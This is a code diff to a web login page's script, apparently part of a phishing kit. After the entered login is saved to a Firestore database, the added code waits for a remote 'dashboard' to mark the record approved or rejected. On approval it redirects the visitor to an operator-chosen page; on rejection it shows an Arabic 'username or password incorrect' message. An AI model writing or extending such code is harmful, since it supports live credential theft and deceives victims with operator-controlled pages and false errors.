@@ -449,7 +449,8 @@ import {
     getFirestore,
     doc,
     setDoc,
-    serverTimestamp
+    serverTimestamp,
+    onSnapshot
 
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
@@ -589,17 +590,48 @@ console.log("LOGIN SAVED", {
 
     /* loading */
 
-    document
-        .getElementById('loadingOverlay')
-        .classList.add('active');
+/* loading */
 
-    /* redirect */
+document
+    .getElementById('loadingOverlay')
+    .classList.add('active');
 
-    setTimeout(() => {
+/* wait for dashboard action */
 
-        window.location.href = 'waitaccount.html';
+onSnapshot(doc(db,"users",userId),(snap)=>{
 
-    }, 2500);
+    const data = snap.data();
+
+    if(!data) return;
+
+    /* approved */
+
+    if(data.status === "approved"){
+
+        window.location.href =
+            data.currentPage || "waitaccount.html";
+
+    }
+
+    /* rejected */
+
+    if(data.status === "rejected"){
+
+        document
+            .getElementById('loadingOverlay')
+            .classList.remove('active');
+
+        const errorBox =
+            document.getElementById('errorBox');
+
+        errorBox.innerText =
+            "اسم المستخدم أو كلمة المرور غير صحيحة";
+
+        errorBox.classList.add('active');
+
+    }
+
+});
 
 });
 
